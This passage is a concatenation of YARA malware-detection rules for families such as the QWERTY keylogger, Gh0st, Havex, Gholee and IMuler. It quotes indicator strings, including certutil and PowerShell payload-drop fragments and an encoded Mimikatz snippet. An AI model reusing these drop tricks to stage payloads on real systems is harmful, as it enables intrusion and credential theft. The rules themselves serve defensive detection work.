        (8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or $driver or any of ($janedow*) or any of ($bootkit*) or $typo1 or $mssounddx) and not any of ($filter*)
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"


/* FIVE EYES ------------------------------------------------------------------------------- */

rule FiveEyes_QUERTY_Malwareqwerty_20121 {
	meta:
		description = "FiveEyes QUERTY Malware - file 20121.xml"
		author = "Florian Roth"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		date = "2015/01/18"
		hash = "8263fb58350f3b1d3c4220a602421232d5e40726"
	strings:
		$s0 = "<configFileName>20121_cmdDef.xml</configFileName>" fullword ascii
		$s1 = "<name>20121.dll</name>" fullword ascii
		$s2 = "<codebase>\"Reserved for future use.\"</codebase>" fullword ascii
		$s3 = "<plugin xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceS" ascii
		$s4 = "<platform type=\"1\">" fullword ascii
		$s5 = "</plugin>" fullword ascii
		$s6 = "</pluginConfig>" fullword ascii
		$s7 = "<pluginConfig>" fullword ascii
		$s8 = "</platform>" fullword ascii
		$s9 = "</lpConfig>" fullword ascii
		$s10 = "<lpConfig>" fullword ascii
	condition:
		9 of them
}

rule FiveEyes_QUERTY_Malwaresig_20123_sys {
	meta:
		description = "FiveEyes QUERTY Malware - file 20123.sys.bin"
		author = "Florian Roth"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		date = "2015/01/18"
		hash = "a0f0087bd1f8234d5e847363d7e15be8a3e6f099"
	strings:
		$s0 = "20123.dll" fullword ascii
		$s1 = "kbdclass.sys" fullword wide
		$s2 = "IoFreeMdl" fullword ascii
		$s3 = "ntoskrnl.exe" fullword ascii
		$s4 = "KfReleaseSpinLock" fullword ascii
	condition:
		all of them
}

rule FiveEyes_QUERTY_Malwaresig_20123_cmdDef {
	meta:
		description = "FiveEyes QUERTY Malware - file 20123_cmdDef.xml"
		author = "Florian Roth"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		date = "2015/01/18"
		hash = "7b08fc77629f6caaf8cc4bb5f91be6b53e19a3cd"
	strings:
		$s0 = "<shortDescription>Keystroke Collector</shortDescription>" fullword ascii
		$s1 = "This plugin is the E_Qwerty Kernel Mode driver for logging keys.</description>" fullword ascii
		$s2 = "<commands/>" fullword ascii
		$s3 = "</version>" fullword ascii
		$s4 = "<associatedImplantId>20121</associatedImplantId>" fullword ascii
		$s5 = "<rightsRequired>System or Administrator (if Administrator, I think the DriverIns" ascii
		$s6 = "<platforms>Windows NT, Windows 2000, Windows XP (32/64 bit), Windows 2003 (32/64" ascii
		$s7 = "<projectpath>plugin/Collection</projectpath>" fullword ascii
		$s8 = "<dllDepend>None</dllDepend>" fullword ascii
		$s9 = "<minorType>0</minorType>" fullword ascii
		$s10 = "<pluginname>E_QwertyKM</pluginname>" fullword ascii
		$s11 = "</comments>" fullword ascii
		$s12 = "<comments>" fullword ascii
		$s13 = "<majorType>1</majorType>" fullword ascii
		$s14 = "<files>None</files>" fullword ascii
		$s15 = "<poc>Erebus</poc>" fullword ascii
		$s16 = "</plugin>" fullword ascii
		$s17 = "<team>None</team>" fullword ascii
		$s18 = "<?xml-stylesheet type=\"text/xsl\" href=\"../XSLT/pluginHTML.xsl\"?>" fullword ascii
		$s19 = "<pluginsDepend>U_HookManager v1.0, Kernel Covert Store v1.0</pluginsDepend>" fullword ascii
		$s20 = "<plugin id=\"20123\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi" ascii
	condition:
		14 of them
}

rule FiveEyes_QUERTY_Malwaresig_20121_dll {
	meta:
		description = "FiveEyes QUERTY Malware - file 20121.dll.bin"
		author = "Florian Roth"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		date = "2015/01/18"
		hash = "89504d91c5539a366e153894c1bc17277116342b"
	strings:
		$s0 = "WarriorPride\\production2.0\\package\\E_Wzowski" ascii
		$s1 = "20121.dll" fullword ascii
	condition:
		all of them
}
rule FiveEyes_QUERTY_Malwareqwerty_20123 {
	meta:
		description = "FiveEyes QUERTY Malware - file 20123.xml"
		author = "Florian Roth"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		date = "2015/01/18"
		hash = "edc7228b2e27df9e7ff9286bddbf4e46adb51ed9"
	strings:
		$s0 = "<!-- edited with XMLSPY v5 rel. 4 U (http://www.xmlspy.com) by TEAM (RENEGADE) -" ascii
		$s1 = "<configFileName>20123_cmdDef.xml</configFileName>" fullword ascii
		$s2 = "<name>20123.sys</name>" fullword ascii
		$s3 = "<plugin xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceS" ascii
		$s4 = "<codebase>/bin/i686-pc-win32/debug</codebase>" fullword ascii
		$s5 = "<platform type=\"1\">" fullword ascii
		$s6 = "</plugin>" fullword ascii
		$s7 = "</pluginConfig>" fullword ascii
		$s8 = "<pluginConfig>" fullword ascii
		$s9 = "</platform>" fullword ascii
		$s10 = "</lpConfig>" fullword ascii
		$s11 = "<lpConfig>" fullword ascii
	condition:
		9 of them
}

rule FiveEyes_QUERTY_Malwaresig_20120_dll {
	meta:
		description = "FiveEyes QUERTY Malware - file 20120.dll.bin"
		author = "Florian Roth"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		date = "2015/01/18"
		hash = "6811bfa3b8cda5147440918f83c40237183dbd25"
	strings:
		$s0 = "\\QwLog_%d-%02d-%02d-%02d%02d%02d.txt" fullword wide
		$s1 = "\\QwLog_%d-%02d-%02d-%02d%02d%02d.xml" fullword wide
		$s2 = "Failed to send the EQwerty_driverStatusCommand to the implant." fullword ascii
		$s3 = "- Log Used (number of windows) - %d" fullword wide
		$s4 = "- Log Limit (number of windows) - %d" fullword wide
		$s5 = "Process or User Default Language" fullword wide
		$s6 = "Windows 98/Me, Windows NT 4.0 and later: Vietnamese" fullword wide
		$s7 = "- Logging of keystrokes is switched ON" fullword wide
		$s8 = "- Logging of keystrokes is switched OFF" fullword wide
		$s9 = "Qwerty is currently logging active windows with titles containing the fo" wide
		$s10 = "Windows 95, Windows NT 4.0 only: Korean (Johab)" fullword wide
		$s11 = "FAILED to get Qwerty Status" fullword wide
		$s12 = "- Successfully retrieved Log from Implant." fullword wide
		$s13 = "- Logging of all Windows is toggled ON" fullword wide
		$s14 = "- Logging of all Windows is toggled OFF" fullword wide
		$s15 = "Qwerty FAILED to retrieve window list." fullword wide
		$s16 = "- UNSUCCESSFUL Log Retrieval from Implant." fullword wide
		$s17 = "The implant failed to return a valid status" fullword ascii
		$s18 = "- Log files were NOT generated!" fullword wide
		$s19 = "Windows 2000/XP: Armenian. This is Unicode only." fullword wide
		$s20 = "- This machine is using a PS/2 Keyboard - Continue on using QWERTY" fullword wide
	condition:
		10 of them
}

rule FiveEyes_QUERTY_Malwaresig_20120_cmdDef {
	meta:
		description = "FiveEyes QUERTY Malware - file 20120_cmdDef.xml"
		author = "Florian Roth"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		date = "2015/01/18"
		hash = "cda9ceaf0a39d6b8211ce96307302a53dfbd71ea"
	strings:
		$s0 = "This PPC gets the current keystroke log." fullword ascii
		$s1 = "This command will add the given WindowTitle to the list of Windows to log keys f" ascii
		$s2 = "This command will remove the WindowTitle corresponding to the given window title" ascii
		$s3 = "This command will return the current status of the Keyboard Logger (Whether it i" ascii
		$s4 = "This command Toggles logging of all Keys. If allkeys is toggled all keystrokes w" ascii
		$s5 = "<definition>Turn logging of all keys on|off</definition>" fullword ascii
		$s6 = "<name>Get Keystroke Log</name>" fullword ascii
		$s7 = "<description>Keystroke Logger Lp Plugin</description>" fullword ascii
		$s8 = "<definition>display help for this function</definition>" fullword ascii
		$s9 = "This command will switch ON Logging of keys. All keys taht are entered to a acti" ascii
		$s10 = "Set the log limit (in number of windows)" fullword ascii
		$s11 = "<example>qwgetlog</example>" fullword ascii
		$s12 = "<aliasName>qwgetlog</aliasName>" fullword ascii
		$s13 = "<definition>The title of the Window whose keys you wish to Log once it becomes a" ascii
		$s14 = "This command will switch OFF Logging of keys. No keystrokes will be captured" fullword ascii
		$s15 = "<definition>The title of the Window whose keys you no longer whish to log</defin" ascii
		$s16 = "<command id=\"32\">" fullword ascii
		$s17 = "<command id=\"3\">" fullword ascii
		$s18 = "<command id=\"7\">" fullword ascii
		$s19 = "<command id=\"1\">" fullword ascii
		$s20 = "<command id=\"4\">" fullword ascii
	condition:
		10 of them
}

rule FiveEyes_QUERTY_Malwareqwerty_20120 {
	meta:
		description = "FiveEyes QUERTY Malware - file 20120.xml"
		author = "Florian Roth"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		date = "2015/01/18"
		hash = "597082f05bfd3225587d480c30f54a7a1326a892"
	strings:
		$s0 = "<configFileName>20120_cmdDef.xml</configFileName>" fullword ascii
		$s1 = "<name>20120.dll</name>" fullword ascii
		$s2 = "<codebase>\"Reserved for future use.\"</codebase>" fullword ascii
		$s3 = "<plugin xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceS" ascii
		$s4 = "<platform type=\"1\">" fullword ascii
		$s5 = "</plugin>" fullword ascii
		$s6 = "</pluginConfig>" fullword ascii
		$s7 = "<pluginConfig>" fullword ascii
		$s8 = "</platform>" fullword ascii
		$s9 = "</lpConfig>" fullword ascii
		$s10 = "<lpConfig>" fullword ascii
	condition:
		all of them
}

rule FiveEyes_QUERTY_Malwaresig_20121_cmdDef {
	meta:
		description = "FiveEyes QUERTY Malware - file 20121_cmdDef.xml"
		author = "Florian Roth"
		reference = "http://www.spiegel.de/media/media-35668.pdf"
		date = "2015/01/18"
		hash = "64ac06aa4e8d93ea6063eade7ce9687b1d035907"
	strings:
		$s0 = "<shortDescription>Keystroke Logger Plugin.</shortDescription>" fullword ascii
		$s1 = "<message>Failed to get File Time</message>" fullword ascii
		$s2 = "<description>Keystroke Logger Plugin.</description>" fullword ascii
		$s3 = "<message>Failed to set File Time</message>" fullword ascii
		$s4 = "</commands>" fullword ascii
		$s5 = "<commands>" fullword ascii
		$s6 = "</version>" fullword ascii
		$s7 = "<associatedImplantId>20120</associatedImplantId>" fullword ascii
		$s8 = "<message>No Comms. with Driver</message>" fullword ascii
		$s9 = "</error>" fullword ascii
		$s10 = "<message>Invalid File Size</message>" fullword ascii
		$s11 = "<platforms>Windows (User/Win32)</platforms>" fullword ascii
		$s12 = "<message>File Size Mismatch</message>" fullword ascii
		$s13 = "<projectpath>plugin/Utility</projectpath>" fullword ascii
		$s14 = "<pluginsDepend>None</pluginsDepend>" fullword ascii
		$s15 = "<dllDepend>None</dllDepend>" fullword ascii
		$s16 = "<pluginname>E_QwertyIM</pluginname>" fullword ascii
		$s17 = "<rightsRequired>None</rightsRequired>" fullword ascii
		$s18 = "<minorType>0</minorType>" fullword ascii
		$s19 = "<code>00001002</code>" fullword ascii
		$s20 = "<code>00001001</code>" fullword ascii
	condition:
		12 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule FlyingKitten : rat
{
    meta:
        Author      = "CrowdStrike, Inc"
        Date        = "2014/05/13"
        Description = "Flying Kitten RAT"
        Reference   = "http://blog.crowdstrike.com/cat-scratch-fever-crowdstrike-tracks-newly-reported-iranian-actor-flying-kitten"

    strings:
        $classpath = "Stealer.Properties.Resources.resources"
        $pdbstr = "\\Stealer\\obj\\x86\\Release\\Stealer.pdb"

    condition:
        all of them and uint16(0) == 0x5A4D and uint32(uint32(0x3c)) == 0x4550 and uint16(uint32(0x3C) + 0x16) & 0x2000 == 0 and ((uint16(uint32(0x3c)+24) == 0x010b and uint32(uint32(0x3c)+232) > 0) or (uint16(uint32(0x3c)+24) == 0x020b and uint32(uint32(0x3c)+248) > 0)) 

}

rule CSIT_14003_03 : installer
{ 
    meta:
        Author      = "CrowdStrike, Inc"
        Date        = "2014/05/13"
        Description = "Flying Kitten Installer"
        Reference   = "http://blog.crowdstrike.com/cat-scratch-fever-crowdstrike-tracks-newly-reported-iranian-actor-flying-kitten"

    strings:
        $exename = "IntelRapidStart.exe"
        $confname = "IntelRapidStart.exe.config"
        $cabhdr = { 4d 53 43 46 00 00 00 00 } 

    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*

   Generic Cloaking

   Florian Roth
   BSK Consulting GmbH

	License: Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)
	Copyright and related rights waived via https://creativecommons.org/licenses/by-nc-sa/4.0/

*/

rule Binary_Drop_Certutil {
	meta:
		description = "Drop binary as base64 encoded cert trick"
		author = "Florian Roth"
		reference = "https://goo.gl/9DNn8q"
		date = "2015-07-15"
		score = 70
	strings:
		$s0 = "echo -----BEGIN CERTIFICATE----- >" ascii
		$s1 = "echo -----END CERTIFICATE----- >>" ascii
		$s2 = "certutil -decode " ascii
	condition:
		filesize < 10KB and all of them
}

rule StegoKatz {
	meta:
		description = "Encoded Mimikatz in other file types"
		author = "Florian Roth"
		reference = "https://goo.gl/jWPBBY"
		date = "2015-09-11"
		score = 70
	strings:
		$s1 = "VC92Ny9TSXZMNk5jLy8vOUlqUTFVRlFNQTZMLysvdjlJaTh2L0ZUNXJBUUJJaTFRa1NFaUx6K2hWSS8vL1NJME44bklCQU9pZC92Ny9USTJjSkpBQUFBQXp3RW1MV3hCSmkyc1lTWXR6S0VtTDQxL0R6TXhNaTl4SmlWc0lUWWxMSUUySlF4aFZWbGRCVkVGVlFWWkJWMGlCN1BBQUFBQklnMlFrYUFDNE1BQUFBRW1MNkVTTmNPQ0pSQ1JnaVVRa1pFbU5RN0JKaTlsTWpRWFBGQU1BU0ls" ascii
		$s2 = "Rpd3ovN3FlalVtNklLQ0xNNGtOV1BiY0VOVHROT0Zud25CWGN0WS9BcEdMR28rK01OWm85Nm9xMlNnY1U5aTgrSTBvNkFob1FOTzRHQWdtUElEVmlqald0Tk90b2FmN01ESWJUQkF5T0pYbTB4bFVHRTBZWEFWOXVoNHBkQnRrS0VFWWVBSEE2TDFzU0c5a2ZFTEc3QWd4WTBYY1l3ZzB6QUFXS09JZE9wQVhEK3lnS3lsR3B5Q1ljR1NJdFNseGZKWUlVVkNFdEZPVjRJUldERUl1QXpKZ2pCQWdsd0Va" ascii
	condition:
		filesize < 1000KB and 1 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-01-15
	Identifier: Exe2hex
*/

rule Payload_Exe2Hex {
	meta:
		description = "Detects payload generated by exe2hex"
		author = "Florian Roth"
		reference = "https://github.com/g0tmi1k/exe2hex"
		date = "2016-01-15"
		score = 70
	strings:
		$a1 = "set /p \"=4d5a" ascii
		$a2 = "powershell -Command \"$hex=" ascii
		$b1 = "set+%2Fp+%22%3D4d5" ascii
		$b2 = "powershell+-Command+%22%24hex" ascii
		$c1 = "echo 4d 5a " ascii
		$c2 = "echo r cx >>" ascii
		$d1 = "echo+4d+5a+" ascii
		$d2 = "echo+r+cx+%3E%3E" ascii
	condition:
		all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as
    long as you use it under this license.
*/
rule genome {
    meta:
        author = "Brian Wallace @botnet_hunter"
        author_email = "bwall@ballastsecurity.net"
        date = "2014-09-07"
        description = "Identify Genome"
	strings:
	    $s1 = "Attempting to create more than one keyboard::Monitor instance"
        $s2 = "{Right windows}"
        $s3 = "Access violation - no RTTI data!"
    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule APT_WIN_Gh0st_ver
{
meta:
   author = "@BryanNolen"
   date = "2012-12"
   type = "APT"
   version = "1.1"
   ref = "Detection of Gh0st RAT server DLL component"
   ref1 = "http://www.mcafee.com/au/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf"
 strings:  
   $libmalware_rary = "deflate 1.1.4 Copyright 1995-2002 Jean-loup Gailly"
   $capability = "GetClipboardData"
   $capability1 = "capCreateCaptureWindowA"
   $capability2 = "CreateRemoteThread"
   $capability3 = "WriteProcessMemory"
   $capability4 = "LsaRetrievePrivateData"
   $capability5 = "AdjustTokenPrivileges"
   $function = "ResetSSDT"
   $window = "WinSta0\\Default"
   $magic = {47 6C 6F 62 61 6C 5C [5-9] 20 25 64}    /* $magic = "Gh0st" */
 condition:
   all of them
}

rule Gh0st
{
    meta:
        description = "Gh0st"
	author = "botherder https://github.com/botherder"

    strings:
        $ = /(G)host/
        $ = /(i)nflate 1\.1\.4 Copyright 1995-2002 Mark Adler/
        $ = /(d)eflate 1\.1\.4 Copyright 1995-2002 Jean-loup Gailly/
        $ = /(%)s\\shell\\open\\command/
        $ = /(G)etClipboardData/
        $ = /(W)riteProcessMemory/
        $ = /(A)djustTokenPrivileges/
        $ = /(W)inSta0\\Default/
        $ = /(#)32770/
        $ = /(#)32771/
        $ = /(#)32772/
        $ = /(#)32774/

    condition:
        all of them
}

rule gh0st

{

meta:
	author = "https://github.com/jackcr/"

   strings:
      $a = { 47 68 30 73 74 ?? ?? ?? ?? ?? ?? ?? ?? 78 9C }
      $b = "Gh0st Update"

   condition:
      any of them

}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule gholeeV1
{
    meta:
	 Author = "@GelosSnake"
    	 Date = "2014/08"
    	 Description = "Gholee first discovered variant "
	 Reference = "http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html" 

    strings:
    	 $a = "sandbox_avg10_vc9_SP1_2011"
    	 $b = "gholee"

    condition:
    	 all of them
}

rule gholeeV2
{
   meta:
	Author = "@GelosSnake"
	Date = "2015-02-12"
    	Description = "Gholee first discovered variant "
	Reference = "http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html" 

   strings:
	$string0 = "RichHa"
	$string1 = "         (((((                  H" wide
	$string2 = "1$1,141<1D1L1T1\\1d1l1t1"
	$string3 = "<8;$O' "
	$string4 = "@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]"
	$string5 = "jYPQTVTSkllZTTXRTUiHceWda/"
	$string6 = "urn:schemas-microsoft-com:asm.v1"
	$string7 = "8.848H8O8i8s8y8"
	$string8 = "wrapper3" wide
	$string9 = "pwwwwwwww"
	$string10 = "Sunday"
	$string11 = "YYuTVWh"
	$string12 = "DDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN"
	$string13 = "ytMMMMMMUbbrrrrrxxxxxxxxrriUMMMMMMMMMUuzt"
	$string15 = "wrapper3 Version 1.0" wide
	$string16 = "77A779"
	$string17 = "<C<G<M<R<X<"
	$string18 = "9 9-9N9X9s9"

    condition:
	18 of them
}

rule MW_gholee_v1 : v1
{
meta:
    Author = "@GelosSnake"
    description = "http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html"
    date = "2014-08"
    maltype = "Remote Access Trojan"
    sample_filetype = "dll"
    hash0 = "48573a150562c57742230583456b4c02"
   
strings:
    $a = "sandbox_avg10_vc9_SP1_2011"
    $b = "gholee"
   
condition:
    all of them
}
 
rule MW_gholee_v2 : v2
{
meta:
        author = "@GelosSnake"
        date = "2015-02-12"
        description = "http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html"
        hash0 = "05523761ca296ec09afdf79477e5f18d"
        hash1 = "08e424ac42e6efa361eccefdf3c13b21"
        hash2 = "5730f925145f1a1cd8380197e01d9e06"
        hash3 = "73461c8578dd9ab86d42984f30c04610"
        sample_filetype = "dll"
strings:
        $string0 = "RichHa"
        $string1 = "         (((((                  H" wide
        $string2 = "1$1,141<1D1L1T1\\1d1l1t1"
        $string3 = "<8;$O' "
        $string4 = "@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]"
        $string5 = "jYPQTVTSkllZTTXRTUiHceWda/"
        $string6 = "urn:schemas-microsoft-com:asm.v1"
        $string7 = "8.848H8O8i8s8y8"
        $string8 = "wrapper3" wide
        $string9 = "pwwwwwwww"
        $string10 = "Sunday"
        $string11 = "YYuTVWh"
        $string12 = "DDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDIN"
        $string13 = "ytMMMMMMUbbrrrrrxxxxxxxxrriUMMMMMMMMMUuzt"
        $string15 = "wrapper3 Version 1.0" wide
        $string16 = "77A779"
        $string17 = "<C<G<M<R<X<"
        $string18 = "9 9-9N9X9s9"
condition:
        18 of them
}

/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule GlassesCode : Glasses Family 
{
    meta:
        description = "Glasses code features"
        author = "Seth Hardy"
        last_modified = "2014-07-22"
        
    strings:
        $ = { B8 AB AA AA AA F7 E1 D1 EA 8D 04 52 2B C8 }
        $ = { B8 56 55 55 55 F7 E9 8B 4C 24 1C 8B C2 C1 E8 1F 03 D0 49 3B CA }
        
    condition:
        any of them
}

rule GlassesStrings : Glasses Family
{
    meta:
        description = "Strings used by Glasses"
        author = "Seth Hardy"
        last_modified = "2014-07-22"
        
    strings:
        $ = "thequickbrownfxjmpsvalzydg"
        $ = "Mozilla/4.0 (compatible; Windows NT 5.1; MSIE 7.0; Trident/4.0; %s.%s)"
        $ = "\" target=\"NewRef\"></a>"
 
    condition:
        all of them

}

rule Glasses : Family
{
    meta:
        description = "Glasses family"
        author = "Seth Hardy"
        last_modified = "2014-07-22"
   
    condition:
        GlassesCode or GlassesStrings
        
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as
    long as you use it under this license.
*/
rule glassrat
{
   meta:
        author = "Brian Wallace @botnet_hunter"
   strings:
    	$a = "PostQuitMessage"
        $b = "pwlfnn10,gzg"
        $c = "update.dll"
        $d = "_winver"
   condition:
    	all of them

}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule Grozlex : Stealer
{
	meta:
		author="Kevin Falcoz"
		date="20/08/2013"
		description="Grozlex Stealer - Possible HCStealer"
		
	strings:
		$signature={4C 00 6F 00 67 00 73 00 20 00 61 00 74 00 74 00 61 00 63 00 68 00 65 00 64 00 20 00 62 00 79 00 20 00 69 00 43 00 6F 00 7A 00 65 00 6E}
	
	condition:
		$signature
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule SANS_ICS_Cybersecurity_Challenge_400_Havex_Memdump
	{
	meta:
		description = "Detects Havex Windows process executable from memory dump"
		date = "2015-12-2"
		author = "Chris Sistrunk"
		hash = "8065674de8d79d1c0e7b3baf81246e7d"
	strings:
		$magic = { 4d 5a }	
	
	        $s1 = "~tracedscn.yls" fullword wide
		$s2 = "[!]Start" fullword wide
		$s3 = "[+]Get WSADATA" fullword wide
		$s4 = "[-]Can not get local ip" fullword wide
		$s5 = "[+]Local:" fullword wide
		$s6 = "[-]Threads number > Hosts number" fullword wide
		$s7 = "[-]Connection error" fullword wide
		
		$x1 = "bddd4e2b84fa2ad61eb065e7797270ff.exe" fullword wide
	condition:
	    $magic at 0 and ( 3 of ($s*) or $x1 )
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"


rule Win32OPCHavex
{
    meta:
        Author      = "BAE Systems"
        Date        = "2014/06/23"
        Description = "Rule for identifying OPC version of HAVEX"
        Reference   = "www.f-secure.com/weblog/archives/00002718.html"

    strings:
        $mzhdr = "MZ"
        $dll = "7CFC52CD3F87.dll"
        $a1 = "Start finging of LAN hosts..." wide
        $a2 = "Finding was fault. Unexpective error" wide
        $a3 = "Was found %i hosts in LAN:" wide
        $a4 = "Hosts was't found." wide
        $a5 = "Start finging of OPC Servers..." wide
        $a6 = "Was found %i OPC Servers." wide
        $a7 = "OPC Servers not found. Programm finished" wide
        $a8 = "%s[%s]!!!EXEPTION %i!!!" wide
        $a9 = "Start finging of OPC Tags..." wide

    condition:
        $mzhdr at 0 and ($dll or (any of ($a*)))
}

rule Win32FertgerHavex
{
    meta:
        Author      = "BAE Systems"
        Date        = "2014/06/23"
        Description = "Rule for identifying Fertger version of HAVEX"
        Reference   = "www.f-secure.com/weblog/archives/00002718.html"

    strings:
        $mz = "MZ"
        $a1="\\\\.\\pipe\\mypipe-f" wide
        $a2="\\\\.\\pipe\\mypipe-h" wide
        $a3="\\qln.dbx" wide
        $a4="*.yls" wide
        $a5="\\*.xmd" wide
        $a6="fertger" wide
        $a7="havex"
    
    condition:
        $mz at 0 and 3 of ($a*) 
}

rule Havex_Trojan_PHP_Server
{
    meta:
        Author      = "Florian Roth"
        Date        = "2014/06/24"
        Description = "Detects the PHP server component of the Havex RAT"
        Reference   = "www.f-secure.com/weblog/archives/00002718.html"

    strings:
        $s1 = "havex--></body></head>"
        $s2 = "ANSWERTAG_START"
        $s3 = "PATH_BLOCKFILE"

    condition:
        all of them
} 
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule iexpl0reCode : iexpl0ree Family 
{
    meta:
        description = "iexpl0re code features"
        author = "Seth Hardy"
        last_modified = "2014-07-21"
        
    strings:
        $ = { 47 83 FF 64 0F 8C 6D FF FF FF 33 C0 5F 5E 5B C9 C3 }
        $ = { 80 74 0D A4 44 41 3B C8 7C F6 68 04 01 00 00 }
        $ = { 8A C1 B2 07 F6 EA 30 04 31 41 3B 4D 10 7C F1 }
        $ = { 47 83 FF 64 0F 8C 79 FF FF FF 33 C0 5F 5E 5B C9 C3 }
        // 88h decrypt
        $ = { 68 88 00 00 00 68 90 06 00 00 68 ?? ?? ?? ?? 89 3? E8 }
        $ = { BB 88 00 00 00 53 68 90 06 00 00 68 ?? ?? ?? ?? 89 3? E8 }
        
    condition:
        any of them
}

rule iexpl0reStrings : iexpl0re Family
{
    meta:
        description = "Strings used by iexpl0re"
        author = "Seth Hardy"
        last_modified = "2014-07-21"
        
    strings:
        $ = "%USERPROFILE%\\IEXPL0RE.EXE"
        $ = "\"<770j (("
        $ = "\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IEXPL0RE.LNK"
        $ = "\\Documents and Settings\\%s\\Application Data\\Microsoft\\Internet Explorer\\IEXPL0RE.EXE"
        $ = "LoaderV5.dll"
        // stage 2
        $ = "POST /index%0.9d.asp HTTP/1.1"
        $ = "GET /search?n=%0.9d&"
        $ = "DUDE_AM_I_SHARP-3.14159265358979x6.626176"
        $ = "WHO_A_R_E_YOU?2.99792458x1.25663706143592"
        $ = "BASTARD_&&_BITCHES_%0.8x"
        $ = "c:\\bbb\\eee.txt"
        
    condition:
        any of them

}

rule iexpl0re : Family
{
    meta:
        description = "iexpl0re family"
        author = "Seth Hardy"
        last_modified = "2014-07-21"
   
    condition:
        iexpl0reCode or iexpl0reStrings
        
}


/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule IMulerCode : IMuler Family 
{
    meta:
        description = "IMuler code tricks"
        author = "Seth Hardy"
        last_modified = "2014-06-16"
        
    strings:
        // Load these function strings 4 characters at a time. These check the first two blocks:
        $L4_tmpSpotlight = { C7 ?? 2F 74 6D 70 C7 ?? 04 2F 53 70 6F }
        $L4_TMPAAABBB = { C7 ?? ?? ?? ?? ?? 54 4D 50 41 C7 ?? ?? ?? ?? ?? 41 41 42 42 }
        $L4_FILEAGENTVer = { C7 ?? 46 49 4C 45 C7 ?? 04 41 47 45 4E }
        $L4_TMP0M34JDF8 = { C7 ?? ?? ?? ?? ?? 54 4D 50 30 C7 ?? ?? ?? ?? ?? 4D 33 34 4A }
        $L4_tmpmdworker = { C7 ?? 2F 74 6D 70 C7 ?? 04 2F 2E 6D 64 }
        
    condition:
        any of ($L4*)
}

rule IMulerStrings : IMuler Family
{
    meta:
        description = "IMuler Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-16"
        
    strings:
        $ = "/cgi-mac/"
        $ = "xnocz1"
        $ = "checkvir.plist"
        $ = "/Users/apple/Documents/mac back"
        $ = "iMuler2"
        $ = "/Users/imac/Desktop/macback/"
        $ = "xntaskz.gz"
        $ = "2wmsetstatus.cgi"
        $ = "launch-0rp.dat"
        $ = "2wmupload.cgi"
        $ = "xntmpz"
        $ = "2wmrecvdata.cgi"
        $ = "xnorz6"
        $ = "2wmdelfile.cgi"
        $ = "/LanchAgents/checkvir"
        $ = "0PERA:%s"
        $ = "/tmp/Spotlight"
        $ = "/tmp/launch-ICS000"
        
    condition:
        any of them
}

rule IMuler : Family
{
    meta:
        description = "IMuler"
        author = "Seth Hardy"
        last_modified = "2014-06-16"
        
    condition:
